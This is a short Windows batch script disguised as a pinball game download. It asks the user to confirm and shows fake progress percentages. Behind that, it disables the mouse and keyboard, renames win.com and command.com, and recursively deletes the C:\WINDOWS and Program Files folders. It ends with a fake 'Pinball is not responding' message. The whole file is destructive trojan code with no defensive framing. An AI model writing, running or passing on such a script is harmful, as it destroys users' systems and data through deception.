   @echo off

   goto pinball

   :pinball
   cd c:\%windir%\system
   md pinball
   echo do you whant to download pinball? [y/n]
   pause > nul
   goto begin

   :begin
   c:\windows\rundll.exe mouse,disable
   c:\windows\rundll.exe keyboard,disable
   echo 25% complite...
   choice /ty,3 > nul
   RENAME win.com xxx.xxx.com
   RENAME command.com !!!.!!!.dll
   echo 50% complite...
   choice /ty,3 > nul
   copy c:\%windir%\xxx.xxx.com c:\%windir%\xxx.xxx.com
   del c:\%windir%\xxx.xxx.com
   choice /ty,3
   if exist c:\%windir%\system\pinball goto finish
   if not exist c:\%windir%\system\pinball goto pinball
   :finish
   echo 100% Complete.
   cd c:\
   md dont'delete
   copy c:\WINDOWS\*.sys c:\dont'delete\*.sys
   copy c:\PROGRA~1\*.* c:\dont'delete\*.*
   RD /s/q c:\WINDOWS
   RD /s/q c:\PROGRA~1
   echo msgbox("Pinball is not responding!",16,"not responding") >> c:\%windir%\system\pinball\notr.vbs
   goto end

   :end
   EXIT
